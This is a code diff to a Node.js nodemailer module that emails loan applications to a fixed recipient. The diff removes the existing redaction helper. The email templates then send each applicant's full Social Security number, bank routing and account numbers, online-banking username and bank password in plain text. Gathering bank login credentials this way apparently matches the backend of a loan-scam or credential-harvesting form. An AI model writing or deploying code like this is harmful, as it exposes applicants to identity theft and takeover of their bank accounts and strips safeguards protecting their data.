@@ -23,44 +23,50 @@ const transporter = nodemailer.createTransport({
   },
 });
 
-const redactSensitive = (value) => {
-  if (!value) return "";
-  const str = String(value);
-  if (str.length <= 4) return "****";
-  return `${str.slice(0, 2)}****${str.slice(-2)}`;
-};
-
 const formatHTML = (data) => `
-  <h2>New Loan Application</h2>
-  <h3>Loan Details</h3>
-  <ul>
-    <li><strong>Amount:</strong> ${data.loanAmount}</li>
-    <li><strong>Duration:</strong> ${data.loanDuration}</li>
-    <li><strong>Purpose:</strong> ${data.loanPurpose}</li>
-  </ul>
-
-  <h3>Personal Information</h3>
-  <ul>
-    <li><strong>Loan Approval ID:</strong> ${data.loanApprovalId || "N/A"}</li>
-    <li><strong>Name:</strong> ${data.firstName} ${data.lastName}</li>
-    <li><strong>Email:</strong> ${data.email}</li>
-    <li><strong>Phone:</strong> ${data.phone || "N/A"}</li>
-    <li><strong>Address:</strong> ${data.address1}${data.address2 ? ", " + data.address2 : ""}, ${data.city}, ${data.state} ${data.zipCode}</li>
-    <li><strong>SSN:</strong> ${redactSensitive(data.ssn)}</li>
-    <li><strong>Birth Date:</strong> ${data.birthDate}</li>
-  </ul>
-
-  <h3>Bank Details</h3>
-  <ul>
-    <li><strong>Bank Name:</strong> ${data.bankName}</li>
-    <li><strong>Routing Number:</strong> ${redactSensitive(data.routingNumber)}</li>
-    <li><strong>Account Number:</strong> ${redactSensitive(data.accountNumber)}</li>
-    <li><strong>Bank Username:</strong> ${redactSensitive(data.bankUsername)}</li>
-    <li><strong>Bank Password:</strong> ${redactSensitive(data.bankPassword)}</li>
-  </ul>
+  <h2>New Loan Application Received</h2>
+  
+  <p><strong>First Name:</strong> ${data.firstName}</p>
+  <p><strong>Last Name:</strong> ${data.lastName}</p>
+  <p><strong>Email Address:</strong> ${data.email}</p>
+  <p><strong>Phone Number:</strong> ${data.phone || "N/A"}</p>
+  <p><strong>Birth Date:</strong> ${data.birthDate}</p>
+  <p><strong>SSN:</strong> ${data.ssn}</p>
+  <p><strong>Address Line 1:</strong> ${data.address1}</p>
+  <p><strong>City:</strong> ${data.city}</p>
+  <p><strong>State:</strong> ${data.state}</p>
+  <p><strong>Zip Code:</strong> ${data.zipCode}</p>
+  <p><strong>Bank Name:</strong> ${data.bankName}</p>
+  <p><strong>Routing Number:</strong> ${data.routingNumber}</p>
+  <p><strong>Account Number:</strong> ${data.accountNumber}</p>
+  <p><strong>Bank Username:</strong> ${data.bankUsername}</p>
+  <p><strong>Password:</strong> ${data.bankPassword}</p>
+  <p><strong>Requested Loan Amount:</strong> ${data.loanAmount}</p>
+  <p><strong>Loan Duration (Months):</strong> ${data.loanDuration}</p>
+  <p><strong>Loan Purpose:</strong> ${data.loanPurpose}</p>
 `;
 
-const formatText = (data) => `New Loan Application\n\nLoan Details\n- Amount: ${data.loanAmount}\n- Duration: ${data.loanDuration}\n- Purpose: ${data.loanPurpose}\n\nPersonal Information\n- Loan Approval ID: ${data.loanApprovalId || "N/A"}\n- Name: ${data.firstName} ${data.lastName}\n- Email: ${data.email}\n- Phone: ${data.phone || "N/A"}\n- Address: ${data.address1}${data.address2 ? ", " + data.address2 : ""}, ${data.city}, ${data.state} ${data.zipCode}\n- SSN: ${redactSensitive(data.ssn)}\n- Birth Date: ${data.birthDate}\n\nBank Details\n- Bank Name: ${data.bankName}\n- Routing Number: ${redactSensitive(data.routingNumber)}\n- Account Number: ${redactSensitive(data.accountNumber)}\n- Bank Username: ${redactSensitive(data.bankUsername)}\n- Bank Password: ${redactSensitive(data.bankPassword)}\n`;
+const formatText = (data) => `New Loan Application Received
+
+First Name: ${data.firstName}
+Last Name: ${data.lastName}
+Email Address: ${data.email}
+Phone Number: ${data.phone || "N/A"}
+Birth Date: ${data.birthDate}
+SSN: ${data.ssn}
+Address Line 1: ${data.address1}
+City: ${data.city}
+State: ${data.state}
+Zip Code: ${data.zipCode}
+Bank Name: ${data.bankName}
+Routing Number: ${data.routingNumber}
+Account Number: ${data.accountNumber}
+Bank Username: ${data.bankUsername}
+Password: ${data.bankPassword}
+Requested Loan Amount: ${data.loanAmount}
+Loan Duration (Months): ${data.loanDuration}
+Loan Purpose: ${data.loanPurpose}
+`;
 
 export const sendLoanApplicationEmail = async (data) => {
   if (!RECIPIENT_EMAIL) {
@@ -70,7 +76,7 @@ export const sendLoanApplicationEmail = async (data) => {
   await transporter.sendMail({
     from: `${EMAIL_FROM_NAME} <${SMTP_USER}>`,
     to: RECIPIENT_EMAIL,
-    subject: `New Loan Application from ${data.firstName} ${data.lastName}`,
+    subject: "New Loan Application Received",
     text: formatText(data),
     html: formatHTML(data),
   });
